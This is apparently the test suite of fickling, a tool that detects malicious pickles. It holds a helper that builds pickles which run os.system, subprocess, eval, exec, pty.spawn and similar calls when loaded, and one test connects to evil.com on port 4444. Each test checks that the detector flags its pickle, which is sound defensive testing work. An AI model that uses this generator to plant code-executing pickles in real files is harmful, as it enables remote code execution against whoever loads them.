"""Comprehensive attack vector tests for fickling.

These tests verify that fickling detects various malicious pickle patterns
across all pickle protocols (0-5). Each test generates malicious pickles
programmatically using __reduce__ and verifies detection.

Inspired by picklescan's malicious test samples.
"""

from __future__ import annotations

import pickle
from typing import Any

import pytest

from fickling.analysis import Severity, check_safety
from fickling.fickle import Pickled


def make_malicious_pickle(
    module: str, func: str, args: tuple[Any, ...] = (), protocol: int = 4
) -> bytes:
    """Create a malicious pickle that calls module.func(*args)."""

    class Payload:
        def __reduce__(self) -> tuple[Any, tuple[Any, ...]]:
            import importlib

            mod = importlib.import_module(module)
            fn = getattr(mod, func)
            return (fn, args)

    return pickle.dumps(Payload(), protocol=protocol)


# Protocols 0-5 cover all pickle protocol versions
PROTOCOLS = [0, 1, 2, 3, 4, 5]


# =============================================================================
# OS Module Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_os_system(protocol: int) -> None:
    """os.system can execute shell commands."""
    data = make_malicious_pickle("os", "system", ("id",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect os.system at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_os_popen(protocol: int) -> None:
    """os.popen can execute shell commands."""
    data = make_malicious_pickle("os", "popen", ("id",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect os.popen at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_os_execv(protocol: int) -> None:
    """os.execv can execute arbitrary programs."""
    data = make_malicious_pickle("os", "execv", ("/bin/sh", ["/bin/sh", "-c", "id"]), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect os.execv at protocol {protocol}"
    )


# =============================================================================
# Subprocess Module Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_subprocess_call(protocol: int) -> None:
    """subprocess.call can execute commands."""
    data = make_malicious_pickle("subprocess", "call", (["id"],), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    # Subprocess should always be detected - severity varies by protocol
    assert result.severity >= Severity.LIKELY_UNSAFE, (
        f"Failed to detect subprocess.call at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_subprocess_popen(protocol: int) -> None:
    """subprocess.Popen can execute commands."""
    data = make_malicious_pickle("subprocess", "Popen", (["id"],), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    # Subprocess should always be detected - severity varies by protocol
    assert result.severity >= Severity.LIKELY_UNSAFE, (
        f"Failed to detect subprocess.Popen at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_subprocess_run(protocol: int) -> None:
    """subprocess.run can execute commands."""
    data = make_malicious_pickle("subprocess", "run", (["id"],), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    # Subprocess should always be detected - severity varies by protocol
    assert result.severity >= Severity.LIKELY_UNSAFE, (
        f"Failed to detect subprocess.run at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_subprocess_check_output(protocol: int) -> None:
    """subprocess.check_output can execute commands."""
    data = make_malicious_pickle("subprocess", "check_output", (["id"],), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    # Subprocess should always be detected - severity varies by protocol
    assert result.severity >= Severity.LIKELY_UNSAFE, (
        f"Failed to detect subprocess.check_output at protocol {protocol}"
    )


# =============================================================================
# Builtins Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_builtins_eval(protocol: int) -> None:
    """builtins.eval can execute arbitrary code."""
    data = make_malicious_pickle("builtins", "eval", ("__import__('os').system('id')",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect builtins.eval at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_builtins_exec(protocol: int) -> None:
    """builtins.exec can execute arbitrary code."""
    data = make_malicious_pickle("builtins", "exec", ("import os; os.system('id')",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect builtins.exec at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_builtins_compile(protocol: int) -> None:
    """builtins.compile can create code objects."""
    data = make_malicious_pickle(
        "builtins",
        "compile",
        ("import os; os.system('id')", "<string>", "exec"),
        protocol,
    )
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect builtins.compile at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_builtins_import(protocol: int) -> None:
    """builtins.__import__ can import arbitrary modules."""
    data = make_malicious_pickle("builtins", "__import__", ("os",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect builtins.__import__ at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_builtins_getattr(protocol: int) -> None:
    """builtins.getattr can be used to access dangerous attributes."""
    data = make_malicious_pickle("builtins", "getattr", (object, "__class__"), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect builtins.getattr at protocol {protocol}"
    )


# =============================================================================
# Network Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_socket_create_connection(protocol: int) -> None:
    """socket.create_connection can establish network connections."""
    data = make_malicious_pickle("socket", "create_connection", (("evil.com", 4444),), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect socket.create_connection at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_socket_socket(protocol: int) -> None:
    """socket.socket can create network sockets."""
    data = make_malicious_pickle("socket", "socket", (), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect socket.socket at protocol {protocol}"
    )


# =============================================================================
# Code Execution Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_runpy_run_path(protocol: int) -> None:
    """runpy.run_path can execute arbitrary Python files."""
    data = make_malicious_pickle("runpy", "run_path", ("/tmp/malicious.py",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity > Severity.LIKELY_SAFE, (
        f"Failed to detect runpy.run_path at protocol {protocol}"
    )
    # More specific check for UnsafeImports detection
    assert any("runpy" in str(r.message) for r in result.results if r.message)


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_runpy_run_module(protocol: int) -> None:
    """runpy.run_module can execute arbitrary modules."""
    data = make_malicious_pickle("runpy", "run_module", ("os",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity > Severity.LIKELY_SAFE, (
        f"Failed to detect runpy.run_module at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_cprofile_run(protocol: int) -> None:
    """cProfile.run can execute code strings."""
    data = make_malicious_pickle("cProfile", "run", ("import os; os.system('id')",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity > Severity.LIKELY_SAFE, (
        f"Failed to detect cProfile.run at protocol {protocol}"
    )


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_code_interactiveinterpreter(protocol: int) -> None:
    """code.InteractiveInterpreter can execute code."""
    data = make_malicious_pickle("code", "InteractiveInterpreter", (), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity > Severity.LIKELY_SAFE, (
        f"Failed to detect code.InteractiveInterpreter at protocol {protocol}"
    )


# =============================================================================
# Importlib Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_importlib_import_module(protocol: int) -> None:
    """importlib.import_module can import arbitrary modules."""
    data = make_malicious_pickle("importlib", "import_module", ("os",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity > Severity.LIKELY_SAFE, (
        f"Failed to detect importlib.import_module at protocol {protocol}"
    )


# =============================================================================
# Marshal + Types Attack Vectors (Code Object Creation)
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_marshal_loads(protocol: int) -> None:
    """marshal.loads can deserialize code objects."""
    import marshal

    code = compile('import os; os.system("id")', "<string>", "exec")
    code_bytes = marshal.dumps(code)
    data = make_malicious_pickle("marshal", "loads", (code_bytes,), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity > Severity.LIKELY_SAFE, (
        f"Failed to detect marshal.loads at protocol {protocol}"
    )


def test_types_functiontype() -> None:
    """types.FunctionType can create executable functions.

    This test uses raw opcode construction because types.FunctionType
    cannot be pickled directly using pickle.dumps with __reduce__.
    """
    import fickling.fickle as op

    # Construct a pickle that imports types.FunctionType using STACK_GLOBAL
    pickled = Pickled(
        [
            op.Proto.create(4),
            op.Frame(30),
            op.ShortBinUnicode("types"),
            op.Memoize(),
            op.ShortBinUnicode("FunctionType"),
            op.Memoize(),
            op.StackGlobal(),
            op.Memoize(),
            op.Stop(),
        ]
    )
    result = check_safety(pickled)
    assert result.severity > Severity.LIKELY_SAFE, "Failed to detect types.FunctionType"


# =============================================================================
# Ctypes Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_ctypes_cdll(protocol: int) -> None:
    """ctypes.CDLL can load arbitrary shared libraries."""
    data = make_malicious_pickle("ctypes", "CDLL", ("libc.so.6",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity > Severity.LIKELY_SAFE, (
        f"Failed to detect ctypes.CDLL at protocol {protocol}"
    )


# =============================================================================
# PTY Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_pty_spawn(protocol: int) -> None:
    """pty.spawn can execute arbitrary programs."""
    data = make_malicious_pickle("pty", "spawn", ("/bin/sh",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect pty.spawn at protocol {protocol}"
    )


# =============================================================================
# Pydoc Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_pydoc_locate(protocol: int) -> None:
    """pydoc.locate can be used to get references to dangerous functions."""
    data = make_malicious_pickle("pydoc", "locate", ("os.system",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity > Severity.LIKELY_SAFE, (
        f"Failed to detect pydoc.locate at protocol {protocol}"
    )


# =============================================================================
# Multiprocessing Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_multiprocessing_util_spawnv_passfds(protocol: int) -> None:
    """multiprocessing.util.spawnv_passfds can execute programs."""
    data = make_malicious_pickle(
        "multiprocessing.util",
        "spawnv_passfds",
        (b"/bin/sh", [b"/bin/sh", b"-c", b"id"], ()),
        protocol,
    )
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity > Severity.LIKELY_SAFE, (
        f"Failed to detect multiprocessing.util.spawnv_passfds at protocol {protocol}"
    )


# =============================================================================
# Sys Module Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_sys_exit(protocol: int) -> None:
    """sys module access should be flagged."""
    data = make_malicious_pickle("sys", "exit", (0,), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity > Severity.LIKELY_SAFE, (
        f"Failed to detect sys.exit at protocol {protocol}"
    )


# =============================================================================
# Posix/NT Attack Vectors
# =============================================================================


@pytest.mark.parametrize("protocol", PROTOCOLS)
def test_posix_system(protocol: int) -> None:
    """posix.system can execute shell commands."""
    data = make_malicious_pickle("posix", "system", ("id",), protocol)
    pickled = Pickled.load(data)
    result = check_safety(pickled)
    assert result.severity >= Severity.LIKELY_OVERTLY_MALICIOUS, (
        f"Failed to detect posix.system at protocol {protocol}"
    )
